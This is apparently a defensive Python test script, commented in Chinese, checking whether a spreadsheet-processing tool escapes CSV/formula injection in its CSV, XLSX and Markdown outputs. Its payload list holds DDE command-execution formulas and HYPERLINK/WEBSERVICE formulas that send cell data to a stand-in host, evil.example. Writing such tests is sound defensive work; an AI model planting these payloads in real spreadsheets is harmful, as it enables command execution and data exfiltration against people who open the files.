#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A3：CSV / 公式注入。

场景：业务表里某个文本单元格（姓名、部门、备注）以 `=`、`+`、`-`、`@` 开头。
这类内容会被 verify 原样写进 verification_detail.csv / mismatches.csv，
再被 output 原样写进 AI处理结果.xlsx。

后果：
  * CSV —— 用户按 SKILL.md 的指引"用 Excel 打开"，Excel 把 `=cmd|'/c calc'!A0`
    当公式解析，DDE / HYPERLINK / WEBSERVICE 直接落地（经典 CSV Injection）。
  * XLSX —— openpyxl 对以 `=` 开头的字符串默认按**公式**写入（data_type='f'），
    等于我们主动把攻击载荷"编译"进交付物，比 CSV 还严重。

判定：产物里出现未转义的危险前缀 / 出现 data_type=='f' 的单元格 → 攻破。
"""
import csv
import os
import shutil
import subprocess
import sys

import openpyxl

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))
SCRIPT = os.path.join(ROOT, "scripts", "excel_ai.py")
WORK = os.path.join(HERE, "_work_a3")

# 经典载荷（不会真的执行，只验证是否被原样写出）
PAYLOADS = [
    ("DDE 命令执行", '=cmd|\'/C calc\'!A0'),
    ("HYPERLINK 外链", '=HYPERLINK("http://evil.example/?d="&A1,"点我")'),
    ("WEBSERVICE 外泄", '=WEBSERVICE("http://evil.example/"&A1)'),
    ("加号变体", '+1+cmd|\'/C calc\'!A0'),
    ("减号变体", '-2+3+cmd|\'/C calc\'!A0'),
    ("@ 变体", '@SUM(1+9)*cmd|\'/C calc\'!A0'),
    ("制表符前缀", '\t=1+1'),
    ("普通公式", '=1+1'),
]
DANGER = ("=", "+", "-", "@", "\t", "\r")


def build_workbook(path):
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "工资明细表"
    ws["A1"] = "某公司 2024 年 5 月工资表"
    ws.merge_cells(start_row=1, start_column=1, end_row=1, end_column=6)
    for j, h in enumerate(["工号", "姓名", "一级部门", "基本工资A", "补贴D", "应发工资G"], start=1):
        ws.cell(row=2, column=j, value=h)
    r = 3
    for i, (nm, pay) in enumerate(PAYLOADS):
        ws.cell(row=r, column=1, value="E%03d" % (i + 1))
        c2 = ws.cell(row=r, column=2, value=pay)       # 姓名列塞载荷
        c3 = ws.cell(row=r, column=3, value="研发中心" if i % 2 else pay)
        # 关键一步：openpyxl 默认把 "=" 开头的字符串存成**公式**，pandas 读回来是
        # None（无缓存值），载荷根本到不了 CSV —— 用例会被自己削弱。
        # 真实场景是用户在 Excel 里键入 '=cmd|...（前导单引号），存出来是**文本**。
        # 这里强制 data_type='s' 来复现那个真实场景。
        for c in (c2, c3):
            if isinstance(c.value, str) and c.value.startswith("="):
                c.data_type = "s"
        ws.cell(row=r, column=4, value=10000 + i * 100)
        ws.cell(row=r, column=5, value=500)
        ws.cell(row=r, column=6, value=10500 + i * 100)
        r += 1
    # 一行故意算错，制造 mismatches.csv 记录，检查它是否也被注入
    ws.cell(row=r, column=1, value="E999")
    cc = ws.cell(row=r, column=2, value='=cmd|\'/C calc\'!A0')
    cc.data_type = "s"
    ws.cell(row=r, column=3, value="财务部")
    ws.cell(row=r, column=4, value=10000)
    ws.cell(row=r, column=5, value=500)
    ws.cell(row=r, column=6, value=99999)   # 与 A+D 不符 → 进 mismatches
    wb.save(path)


SPEC = """{
 "workbook": "%s",
 "sheet": "工资明细表",
 "header_rows": 2,
 "keys": {"ID": "工号", "NAME": "姓名"},
 "dimensions": {"DEPT": "一级部门"},
 "fields": {"A": "基本工资A", "D": "补贴D", "G_x": "应发工资G"},
 "checks": [{"name": "应发G", "target": "G_x", "expr": "round(A + D, 2)", "tolerance": 0.01}],
 "analysis": {"distributions": [{"dim": "NAME"}],
              "top_n": [{"field": "A", "n": 3, "label": "NAME"}]}
}"""


def run(args, wall=120):
    p = subprocess.run([sys.executable, SCRIPT] + args, capture_output=True, timeout=wall)
    return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")


def scan_csv(path):
    """返回未转义的危险单元格列表 [(行, 列名, 值)]。"""
    hits = []
    with open(path, "r", encoding="utf-8-sig", newline="") as f:
        rd = csv.DictReader(f)
        for i, row in enumerate(rd, start=1):
            for k, v in row.items():
                if isinstance(v, str) and v and v[0] in DANGER:
                    # 纯数字的 -100 / +3 不算（Excel 当数字，不是公式）
                    try:
                        float(v)
                        continue
                    except ValueError:
                        pass
                    hits.append((i, k, v[:60]))
    return hits


def main():
    if os.path.isdir(WORK):
        shutil.rmtree(WORK)
    os.makedirs(WORK)
    xlsx = os.path.join(WORK, "注入源表.xlsx")
    build_workbook(xlsx)
    spec = os.path.join(WORK, "spec.json")
    with open(spec, "w", encoding="utf-8") as f:
        f.write(SPEC % xlsx)

    v_out = os.path.join(WORK, "03_verify")
    o_out = os.path.join(WORK, "04_output")
    broken = []

    print("=" * 92)
    print("A3-1 verify → CSV 注入")
    print("=" * 92)
    rc, out, err = run(["verify", spec, "-o", v_out])
    print("  verify 退出码 %d%s" % (rc, "（Traceback！）" if "Traceback" in err else ""))
    if "Traceback" in err:
        broken.append(("verify 直接崩了", err.strip().splitlines()[-1][:110]))
    for fn in ("verification_detail.csv", "mismatches.csv"):
        p = os.path.join(v_out, fn)
        if not os.path.isfile(p):
            print("  [FAIL] 产物缺失：%s" % fn)
            broken.append(("产物缺失", fn))
            continue
        hits = scan_csv(p)
        if hits:
            broken.append(("%s 存在未转义公式注入" % fn, "%d 处，例：%s" % (len(hits), hits[0][2])))
            print("  [FAIL] %s：%d 处未转义危险单元格" % (fn, len(hits)))
            for h in hits[:6]:
                print("         行%-3s 列「%s」 = %r" % (h[0], h[1], h[2]))
        else:
            print("  [PASS] %s：无未转义危险单元格" % fn)

    print()
    print("=" * 92)
    print("A3-2 output → xlsx 里被写成活公式")
    print("=" * 92)
    detail = os.path.join(v_out, "verification_detail.csv")
    if os.path.isfile(detail):
        rc, out, err = run(["output", spec, "-d", detail, "-o", o_out])
        print("  output 退出码 %d%s" % (rc, "（Traceback！）" if "Traceback" in err else ""))
        xp = os.path.join(o_out, "AI处理结果.xlsx")
        if not os.path.isfile(xp):
            print("  [FAIL] 产物缺失：AI处理结果.xlsx")
            broken.append(("产物缺失", "AI处理结果.xlsx"))
        else:
            wb = openpyxl.load_workbook(xp, data_only=False)
            fcells = []
            for ws in wb.worksheets:
                for row in ws.iter_rows():
                    for c in row:
                        if c.data_type == "f":
                            fcells.append((ws.title, c.coordinate, str(c.value)[:60]))
            if fcells:
                broken.append(("AI处理结果.xlsx 里出现活公式单元格",
                               "%d 个，例：%s!%s = %s" % (len(fcells), fcells[0][0], fcells[0][1], fcells[0][2])))
                print("  [FAIL] 出现 %d 个 data_type='f' 的活公式单元格：" % len(fcells))
                for t, coord, v in fcells[:6]:
                    print("         %s!%s = %r" % (t, coord, v))
            else:
                print("  [PASS] 无活公式单元格")
            wb.close()

    print()
    print("=" * 92)
    print("A3-2b 转义必须可逆：xlsx 里的姓名要能还原成原文，不能被 ' 污染")
    print("=" * 92)
    xp = os.path.join(o_out, "AI处理结果.xlsx")
    if os.path.isfile(xp):
        wb = openpyxl.load_workbook(xp, data_only=False)
        ws = wb["AI处理结果"]
        hdr_row = None
        for row in ws.iter_rows(min_row=1, max_row=12):
            vals = [str(c.value) if c.value is not None else "" for c in row]
            if "NAME" in vals:
                hdr_row, name_col = row[0].row, vals.index("NAME") + 1
                break
        got = []
        if hdr_row:
            for rr in range(hdr_row + 1, ws.max_row + 1):
                v = ws.cell(row=rr, column=name_col).value
                if v is not None:
                    got.append(str(v))
        want = [p for _n, p in PAYLOADS] + ["=cmd|'/C calc'!A0"]
        want = [w.strip() for w in want]          # 脚本会 strip 单元格
        bad = [(w, g) for w, g in zip(want, got) if w != g]
        if len(got) != len(want):
            print("  [WARN] 姓名列取到 %d 行，期望 %d 行" % (len(got), len(want)))
        if bad:
            broken.append(("转义不可逆，姓名被改写",
                           "例：原文 %r → 产物 %r" % (bad[0][0], bad[0][1])))
            print("  [FAIL] %d 个姓名与原文不一致：" % len(bad))
            for w, g in bad[:5]:
                print("         原文 %r → 产物 %r" % (w, g))
        else:
            print("  [PASS] %d 个含载荷的姓名全部原样还原（转义可逆）" % len(got))
        wb.close()

    print()
    print("=" * 92)
    print("A3-3 analyze → 报告里的载荷（Markdown 注入观察）")
    print("=" * 92)
    if os.path.isfile(detail):
        rc, out, err = run(["analyze", spec, "-d", detail, "-o", o_out])
        print("  analyze 退出码 %d%s" % (rc, "（Traceback！）" if "Traceback" in err else ""))
        if "Traceback" in err:
            broken.append(("analyze 崩了", err.strip().splitlines()[-1][:110]))
        rp = os.path.join(o_out, "分析报告.md")
        if os.path.isfile(rp):
            txt = open(rp, encoding="utf-8").read()
            bad_rows = [ln for ln in txt.splitlines() if "cmd|" in ln]
            print("  报告含载荷文本 %d 行（MD 只是展示，不执行；仅记录）" % len(bad_rows))
            broken_md = [ln for ln in bad_rows if "|" in ln and "\\|" not in ln]
            if broken_md:
                print("  [WARN] 载荷里的竖线未转义会打乱 MD 表格：%s" % broken_md[0][:90])

    print()
    print("=" * 92)
    print("A3 小结：攻破 %d 项" % len(broken))
    for t, d in broken:
        print("  * %s：%s" % (t, d))
    return 1 if broken else 0


if __name__ == "__main__":
    sys.exit(main())
